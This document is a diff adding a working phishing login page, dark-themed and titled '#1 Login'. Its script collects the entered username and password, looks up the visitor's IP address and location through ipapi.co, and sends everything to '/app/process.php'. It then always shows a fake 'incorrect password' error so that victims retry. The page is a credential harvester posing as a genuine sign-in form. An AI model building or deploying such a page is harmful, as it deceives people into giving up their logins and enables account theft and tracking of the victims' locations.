@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>#1 Login</title>
+    <style>
+        body {
+            background: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+            padding: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border-radius: 6px;
+            border: 1px solid #333;
+            background: transparent;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: white;
+            color: black;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .error {
+            color: #ff4444;
+            margin-top: 12px;
+            display: none;
+        }
+        .success {
+            color: #00c853;
+            margin-top: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="text-align:center; font-size:40px; margin-bottom:20px;">#1</h1>
+        <h2 style="text-align:center;">Login</h2>
+        
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        
+        <button id="loginBtn">Sign in</button>
+        
+        <div class="error" id="errorMsg">Incorrect password. Try again.</div>
+        <div class="success" id="successMsg">✅ Redirecting...</div>
+    </div>
+
+    <script>
+        const PROCESS_URL = '/app/process.php';
+
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown',
+                    state: data.region || 'Unknown'
+                };
+            } catch {
+                return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', state: 'Unknown' };
+            }
+        }
+
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const successMsg = document.getElementById('successMsg');
+
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            if (!username || !password) {
+                errorMsg.textContent = 'Please fill in all fields';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            this.disabled = true;
+            this.textContent = 'Logging in...';
+
+            const loc = await getLocation();
+            const url = `${PROCESS_URL}?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}&ip=${encodeURIComponent(loc.ip)}&country=${encodeURIComponent(loc.country)}&city=${encodeURIComponent(loc.city)}&state=${encodeURIComponent(loc.state)}`;
+
+            fetch(url).catch(() => {});
+
+            setTimeout(() => {
+                this.disabled = false;
+                this.textContent = 'Sign in';
+                errorMsg.textContent = 'The password you entered is incorrect.';
+                errorMsg.style.display = 'block';
+                document.getElementById('password').value = '';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
